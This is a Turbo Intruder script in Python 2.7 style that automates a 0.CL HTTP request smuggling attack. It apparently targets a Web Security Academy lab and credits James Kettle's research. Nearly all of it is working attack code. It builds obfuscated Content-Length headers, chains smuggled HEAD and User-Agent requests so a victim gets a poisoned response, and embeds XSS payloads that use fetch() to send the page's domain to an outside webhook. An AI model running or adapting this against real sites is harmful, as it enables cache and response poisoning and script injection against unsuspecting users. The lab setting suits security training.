# Universal 0.CL Request Smuggling Script for Turbo Intruder
# Based on research by James Kettle: https://portswigger.net/research/http1-must-die
# Implements BOTH HEAD redirect and User-Agent XSS techniques
#
# IMPORTANT:
# - Turbo Intruder uses Jython (Python 2.7)
# - f-strings are NOT supported
# - This version replaces all f-strings with .format()

# ============================================================================
# CONFIGURATION - Customize these for your target
# ============================================================================

CONFIG = {
    # Target configuration
    'target_host': '0a95005e0424a1c480e78a9000270073.web-security-academy.net/',
    'target_port': 443,
    'use_https': True,

    # Webhook for XSS callback (Burp Collaborator, webhook.site, interact.sh)
    'webhook_url': 'https://webhook.site/53f44ca3-bcb2-4d66-bb8f-58c0da9d71ed',  # CHANGE THIS!

    # Attack method selection
    'attack_method': 'both',  # Options: 'head', 'user-agent', 'both'

    # Attack vectors
    'gadget_path': '/resources/css/labsBlog.css',  # Early-response gadget
    'gadget_method': 'POST',

    # HEAD technique configuration (preferred)
    'head_static_resources': [
        '/static/app.js',
        '/static/main.css',
        '/resources/script.js',
        '/assets/style.css',
        '/js/main.js',
        '/css/app.css',
    ],

    # User-Agent technique configuration (fallback)
    'smuggled_method': 'GET',
    'smuggled_path': '/',

    # Detection configuration
    'detection_path': '/404',

    # Engine configuration
    'concurrent_connections': 10,
    'requests_per_connection': 1,
    'timeout': 15,
    'max_retries': 0,
    'attack_iterations': 100,

    # Advanced options
    'content_length_obfuscation': 'space',  # space | tab | newline | multiple
    'stage2_method': 'OPTIONS',
    'add_cache_buster': True,
}

# ============================================================================
# MAIN ATTACK LOGIC
# ============================================================================

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=CONFIG['concurrent_connections'],
        requestsPerConnection=CONFIG['requests_per_connection'],
        engine=Engine.BURP,
        maxRetriesPerRequest=CONFIG['max_retries'],
        timeout=CONFIG['timeout']
    )

    # Safety check
    if 'YOUR-WEBHOOK' in CONFIG['webhook_url']:
        raise Exception('Please configure your webhook URL in CONFIG!')

    host = CONFIG['target_host']

    # Build headers and request stages
    cl_header = build_cl_header(CONFIG['content_length_obfuscation'])
    stage1 = build_stage1(host, cl_header)
    stage2_chopped = build_stage2_chopped()
    stage2_revealed = build_stage2_revealed(host)
    victim = build_victim_request(host)

    # Status output
    print('[*] Starting 0.CL Request Smuggling attack')
    print('[*] Target: {}'.format(host))
    print('[*] Webhook: {}'.format(CONFIG['webhook_url']))
    print('[*] Attack Method: {}'.format(CONFIG['attack_method'].upper()))
    print('[*]')

    iteration = 0
    resource_index = 0

    # Main attack loop
    while CONFIG['attack_iterations'] == -1 or iteration < CONFIG['attack_iterations']:

        # Choose technique
        if CONFIG['attack_method'] == 'both':
            use_head = (iteration % 2 == 0)
        elif CONFIG['attack_method'] == 'head':
            use_head = True
        else:
            use_head = False

        # Build smuggled request
        if use_head:
            static_resource = CONFIG['head_static_resources'][
                resource_index % len(CONFIG['head_static_resources'])
            ]
            smuggled = build_smuggled_head_request(host, static_resource)
            technique = 'HEAD'
            resource_index += 1
        else:
            smuggled = build_smuggled_useragent_request(host)
            technique = 'User-Agent'

        chopped_length = len(stage2_chopped)

        # Queue attack chain
        engine.queue(stage1, chopped_length, label='stage1', fixContentLength=False)
        engine.queue(stage2_chopped + stage2_revealed + smuggled,
                     label='stage2-' + technique)
        engine.queue(victim, label='victim-' + technique)

        iteration += 1

# ============================================================================
# PAYLOAD BUILDERS
# ============================================================================

def build_xss_payload():
    """XSS payload for User-Agent technique"""
    return '"/><script>fetch("{}?xss="+document.domain)</script><x x="'.format(
        CONFIG['webhook_url']
    )

def build_head_xss_payload():
    """XSS payload for HEAD redirect technique"""
    return '</script><script>fetch("{}?head="+document.domain)</script>'.format(
        CONFIG['webhook_url']
    )

# ============================================================================
# REQUEST BUILDERS
# ============================================================================

def build_cl_header(obfuscation_type):
    """Build Content-Length header obfuscation"""
    if obfuscation_type == 'space':
        return 'Content-Length : %s'
    elif obfuscation_type == 'tab':
        return 'Content-Length\t: %s'
    elif obfuscation_type == 'newline':
        return 'Content-Length\r\n : %s'
    elif obfuscation_type == 'multiple':
        return 'Content-Length: 0\r\nContent-Length : %s'
    return 'Content-Length : %s'

def build_stage1(host, cl_header):
    """Stage 1: Early response gadget"""
    import random
    cache_buster = ''
    if CONFIG['add_cache_buster']:
        cache_buster = '?cb={}'.format(random.randint(1000, 9999))

    return (
        "{} {}{} HTTP/1.1\r\n"
        "Host: {}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Connection: keep-alive\r\n"
        "{}\r\n"
        "\r\n"
    ).format(
        CONFIG['gadget_method'],
        CONFIG['gadget_path'],
        cache_buster,
        host,
        cl_header
    )

def build_smuggled_head_request(host, resource):
    """Smuggled HEAD request (James Kettle technique)"""
    payload = build_head_xss_payload()
    return (
        "HEAD {}?x={} HTTP/1.1\r\n"
        "Host: {}\r\n"
        "Content-Length: 5\r\n"
        "\r\n"
        "x=1"
    ).format(resource, payload, host)

def build_smuggled_useragent_request(host):
    """Smuggled request with XSS in User-Agent"""
    payload = build_xss_payload()
    return (
        "{} {} HTTP/1.1\r\n"
        "Host: {}\r\n"
        "User-Agent: {}\r\n"
        "Content-Length: 5\r\n"
        "\r\n"
        "x=1"
    ).format(
        CONFIG['smuggled_method'],
        CONFIG['smuggled_path'],
        host,
        payload
    )

def build_stage2_chopped():
    """Stage 2 chopped request"""
    return (
        "{} / HTTP/1.1\r\n"
        "Content-Length: 123\r\n"
        "X: Y"
    ).format(CONFIG['stage2_method'])

def build_stage2_revealed(host):
    """Stage 2 revealed request"""
    import random
    cache_buster = ''
    if CONFIG['add_cache_buster']:
        cache_buster = '?cb={}'.format(random.randint(1000, 9999))

    return (
        "GET {}{} HTTP/1.1\r\n"
        "Host: {}\r\n"
        "User-Agent: smuggle-detector\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
    ).format(CONFIG['detection_path'], cache_buster, host)

def build_victim_request(host):
    """Victim request that may receive poisoned response"""
    return (
        "GET / HTTP/1.1\r\n"
        "Host: {}\r\n"
        "User-Agent: victim-browser\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
    ).format(host)

# ============================================================================
# RESPONSE HANDLING
# ============================================================================

def handleResponse(req, interesting):
    table.add(req)

    # Focus on victim responses
    if 'victim' in req.label and req.response:
        if CONFIG['webhook_url'] in req.response:
            print('[+] SUCCESS: Webhook URL reflected!')
            req.interesting = True

